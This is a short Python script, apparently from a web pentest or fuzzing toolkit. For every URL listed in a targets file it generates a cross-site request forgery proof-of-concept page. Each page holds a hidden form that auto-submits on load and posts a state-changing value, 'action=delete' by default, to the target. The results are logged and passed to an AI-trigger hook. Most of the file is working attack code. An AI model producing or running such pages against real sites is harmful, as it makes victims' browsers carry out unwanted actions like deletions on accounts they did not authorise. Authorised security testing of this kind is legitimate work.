import os
import sys
sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), '..')))

from log_to_text import log_to_text
from tools.auto_add_severity import classify_severity
from logics.fuzz_ai_trigger import ai_trigger_if_needed

def generate_csrf_poc(url, param="action", value="delete"):
    html = f"""<html>
  <body>
    <form action="{url}" method="POST">
      <input type="hidden" name="{param}" value="{value}">
      <input type="submit" value="Submit CSRF">
    </form>
    <script>document.forms[0].submit();</script>
  </body>
</html>"""

    filename = f"csrf_poc_{param}_{value}.html"
    with open(filename, "w") as f:
        f.write(html)

    log_to_text(f"[CSRF_POC] Generated PoC for {url} -> {filename}")
    ai_trigger_if_needed("CSRF", url, f"{param}={value}", html, "medium")
    print(f"[+] CSRF PoC generisan: {filename}")
    return filename

if __name__ == "__main__":
    with open("targets/targets.txt", "r") as f:
        targets = f.read().splitlines()

    for url in targets:
        generate_csrf_poc(url)
